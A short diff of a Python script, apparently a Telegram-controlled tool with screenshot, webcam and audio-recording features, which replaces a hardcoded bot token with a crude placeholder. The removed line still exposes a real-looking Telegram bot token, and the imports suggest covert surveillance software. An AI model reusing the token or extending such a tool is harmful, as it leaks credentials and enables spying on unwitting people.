@@ -15,7 +15,7 @@ import wavio
 from screeninfo import get_monitors as screeninfo
 import urllib.request
 my_id = 6323712252
-bot = telebot.TeleBot('6367707654:AAGF8iXELjKakdxkGUBvVe92utXOw8Y_WjI')
+bot = telebot.TeleBot('Insert here your fucking token')
 recording = False
 EMOJI_SCREENSHOT = "📸"
 EMOJI_WEBCAM = "🎥"
